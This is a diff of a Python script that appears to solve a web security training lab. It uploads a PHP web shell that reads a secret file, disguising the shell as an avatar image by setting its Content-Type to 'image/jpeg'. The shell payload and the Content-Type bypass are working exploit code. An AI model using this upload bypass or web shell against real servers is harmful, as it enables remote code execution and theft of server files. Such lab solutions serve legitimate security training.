@@ -1,4 +1,4 @@
-# Lab: Web shell upload via Content-Type restriction bypass
+# Lab: Remote code execution via web shell upload
 
 import requests
 import re
@@ -64,7 +64,7 @@ def upload_file(csrf_token):
     # }
 
     file = {
-        'avatar': ('file_upload.php', '<?php echo file_get_contents("/home/carlos/secret") ?>','text/php'),
+        'avatar': ('file_upload.php', '<?php echo file_get_contents("/home/carlos/secret") ?>','image/jpeg'),
         'user': (None, 'wiener', None),
         'csrf': (None, csrf_token, None)
     }
